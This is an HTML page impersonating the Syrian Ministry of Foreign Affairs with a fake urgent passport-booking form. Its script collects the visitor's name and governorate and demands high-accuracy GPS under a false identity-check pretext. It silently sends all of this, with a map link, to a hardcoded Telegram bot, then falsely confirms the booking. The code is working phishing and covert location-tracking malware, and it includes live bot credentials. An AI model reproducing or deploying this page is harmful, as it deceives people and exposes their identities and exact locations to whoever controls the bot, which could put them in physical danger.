<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
    <style>
        /* إعدادات الخط العريض جداً */
        body { 
            font-family: 'Cairo', 'Segoe UI', 'Arial Black', sans-serif; 
            background-color: #ffffff; 
            margin: 0; 
            padding: 0; 
            text-align: center;
            font-weight: 900; /* أقصى درجة عرض للخط */
        }
        .header-main {
            padding: 15px 0;
            border-bottom: 5px solid #b38a2e;
            background-color: #fff;
        }
        .header-main img {
            max-width: 95%;
            height: auto;
        }
        .container {
            max-width: 480px;
            margin: 30px auto;
            padding: 25px;
            border: 2px solid #b38a2e;
            border-radius: 12px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }
        /* العناوين العريضة */
        h2 { 
            color: #1a237e; 
            font-size: 26px; 
            margin-bottom: 15px;
            font-weight: 900; 
            letter-spacing: -1px;
        }
        .alert-box {
            background-color: #d32f2f;
            color: white;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-size: 18px;
            font-weight: 900;
        }
        label { 
            display: block; 
            text-align: right; 
            margin-bottom: 10px; 
            font-size: 20px;
            color: #000;
        }
        input, select {
            width: 100%;
            padding: 15px;
            margin-bottom: 25px;
            border: 3px solid #ced4da;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 18px;
            font-weight: 800;
            text-align: center;
        }
        /* الزر العريض والضخم */
        .btn-submit {
            background-color: #1b5e20;
            color: white;
            padding: 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-size: 22px;
            font-weight: 900;
            box-shadow: 0 5px 15px rgba(27, 94, 32, 0.4);
        }
        .footer {
            margin-top: 40px;
            font-size: 14px;
            font-weight: 700;
            color: #333;
            padding-bottom: 30px;
        }
    </style>
</head>
<body>

    <div class="header-main">
        <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار وزارة الخارجية">
    </div>

    <div class="container">
        <h2>نظام حجز الجواز المستعجل</h2>
        <div class="alert-box">
            حجز فوري بقيمة 40 دولار فقط
        </div>

        <label>الاسم الكامل (ثلاثي):</label>
        <input type="text" id="full_name" placeholder="اكتب اسمك هنا">

        <label>اختر محافظتك:</label>
        <select id="city">
            <option value="">-- اضغط هنا للاختيار --</option>
            <option value="إدلب">إدلب</option>
            <option value="حلب">حلب</option>
            <option value="دمشق">دمشق</option>
            <option value="حمص">حمص</option>
            <option value="حماة">حماة</option>
            <option value="اللاذقية">اللاذقية</option>
            <option value="طرطوس">طرطوس</option>
            <option value="دير الزور">دير الزور</option>
        </select>

        <button class="btn-submit" onclick="startProcess()">تأكيد الحجز الآن</button>
    </div>

    <div class="footer">
        بوابة وزارة الخارجية والمغتربين © 2026
    </div>

    <script>
        function startProcess() {
            let name = document.getElementById("full_name").value;
            let city = document.getElementById("city").value;

            if (name == "" || city == "") {
                alert("يرجى كتابة الاسم واختيار المحافظة!");
                return;
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    sendToTelegram(position, name, city);
                }, function(error) {
                    alert("⚠️ خطأ: يجب تفعيل الـ GPS للتأكد من هويتك ومنطقتك الجغرافية لإتمام الحجز.");
                }, { enableHighAccuracy: true });
            } else {
                alert("جهازك لا يدعم الخدمة.");
            }
        }

        function sendToTelegram(position, name, city) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
            let chat_id = "7214473798";
            
            let text = `🎯 صيد جوازات جديد!\n\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;

            // استخدام طريقة الـ Image Beacon لضمان التوصيل الفوري
            let finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
            let img = new Image();
            img.src = finalUrl;

            alert("✅ تم الحجز! سيتم إرسال الكود السري لهاتفك خلال دقائق.");
        }
    </script>
</body>
</html>
